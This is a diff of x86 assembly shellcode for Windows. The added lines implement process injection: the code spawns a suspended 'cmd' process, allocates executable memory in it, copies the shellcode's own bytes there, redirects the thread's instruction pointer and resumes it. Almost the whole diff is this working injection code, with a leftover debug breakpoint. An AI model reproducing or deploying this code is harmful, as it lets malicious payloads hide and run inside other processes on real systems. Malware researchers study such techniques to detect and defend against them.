@@ -92,30 +92,73 @@ _start:
     fork:
     	; ======= Create STARTUPINFO object ==========================
 	int 3
-        xor ecx, ecx                    ; Zero ECX
-        mov cl, 0x54                    ; Set the lower order bytes of ECX to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
-        sub esp, ecx                    ; Allocate stack space for the two structures
-        mov edi, esp                    ; set edi to point to the STARTUPINFO structure
-        push edi                        ; Preserve EDI on the stack as it will be modified by the following instructions
-        xor eax, eax                    ; Zero EAX
-        rep stosb                       ; Repeat storing zero at the buffer starting at edi until ecx is zero
-        pop edi                         ; restore EDI to its original value
-        mov byte[edi], 0x44             ; cb = 0x44 (size of the structure)
+	xor eax, eax		; Zero EAX
+	xor ecx, ecx		; Zero ECX
+	mov cl, 0x54		; The size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
+	sub esp, ecx		; Allocate stack space for the two structures
+	mov edi, esp		; set edi to point to the STARTUPINFO structure
+	push edi		; Preserve EDI on the stack as it will be modified by the following instructions
+	rep stosb		; Repeat storing zero at the buffer starting at edi until ecx is zero
+	pop edi			; restore EDI to its original value
+	mov byte[edi], 0x44	; cb = 0x44 (size of the structure)
 
-	; Begin CreateProcess 
-        xor eax, eax                    ; Zero EAX
-        lea esi, [edi+0x44]             ; Load the effective address of the PROCESS_INFORMATION structure into ESI
-        push esi                        ; Push the pointer to the lpProcessInformation structure
-        push edi                        ; Push the pointer to the lpStartupInfo structure
-	push eax					; lpCurrentDirectory = NULL
-	push eax					; lpEnvironment = NULL
-	push 0x04					; dwCreationFlags = CREATE_SUSPENDED
-	push eax					; bInheritHandles = FALSE
-	push eax					; lpThreadAttributes = NULL
-	push eax					; lpProcessAttributes = NULL
-	push dword [ebp+0x3C]				; lpCommandLine = "cmd"
-	push eax					; lpApplicationName = NULL
-	call [ebp+0x08]					; Call CreateProcess
+	; Create Suspended Process 
+	lea esi, [edi+0x44]	; Load the effective address of the PROCESS_INFORMATION structure into ESI
+	push esi		; Push the pointer to the lpProcessInformation structure
+	push edi		; Push the pointer to the lpStartupInfo structure
+	push eax		; lpCurrentDirectory = NULL
+	push eax		; lpEnvironment = NULL
+	push 0x04		; dwCreationFlags = CREATE_SUSPENDED
+	push eax		; bInheritHandles = FALSE
+	push eax		; lpThreadAttributes = NULL
+	push eax		; lpProcessAttributes = NULL
+	push dword [ebp+0x3C]	; lpCommandLine = "cmd"
+	push eax		; lpApplicationName = NULL
+	call [ebp+0x08]		; Call CreateProcess
+
+	; Begin GetThreadContext
+	sub esp, 0x0400		; Create 1024 bytes for CONTEXT object on stack
+	push 0x010007		; CONTEXT ContextFlags = CONTEXT_FULL
+	push esp		; lpContext
+	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
+	call [ebp+0x14]		; Call GetThreadContext
+
+	; Begin VirtualAllocEx
+	push 0x40		; flProtect = PAGE_EXECUTE_READWRITE
+	push 0x1000		; flAllocationType = MEM_COMMIT
+	push 0x5000		; dwSize = 20kb
+	push 0			; lpAddress = NULL
+	push dword [esi]	; hProcess = PROCESS_INFORMATION.hProcess = ESI
+	call [ebp+0x18]		; Call VirtualAllocEx
+
+	; Setup CONTEXT object for thread change
+	mov ebx, eax		; Move buffer address to EBX
+	;add ebx, 0x100		; EIP = buf + 2 (jmp instruction)
+	mov [esp+0xB8], ebx	; CONTEXT object offset 0xB8 = EIP
+	mov [esp+0xB4], ebx	; CONTEXT object offset 0xB4 = EIP
+
+	; Overwrite Fork Call
+	mov ecx, [ebp-0x10]		; Fork Return
+	mov dword [ecx-5], 0x90909090	; Overwrite first 4 bytes of call
+	mov byte [ecx-1], 0x90		; Overwrite last byte of call
+	sub ecx, 0x19B			; Bytes to subtract to reach beginning of shellcode, change as needed
+
+	; Begin WriteProcessMemory
+	push 0			; lpNumberOfBytesWritten = NULL
+	push 0x1000		; nSize = 0x1000
+	push ecx		; lpBuffer = ECX
+	push eax		; lpBaseAddress = EAX
+	push dword [esi]	; hProcess = PROCESS_INFORMATION.hProcess = ESI
+	call [ebp+0x1C]		; Call WriteProcessMemory
+
+	; Begin SetThreadContext
+	push esp		; lpContext = CONTEXT structure
+	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
+	call [ebp+0x20]		; Call SetThreadContext
+
+	; Begin ResumeThread
+	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
+	call [ebp+0x24]		; Call ResumeThread
 	ret
 
     
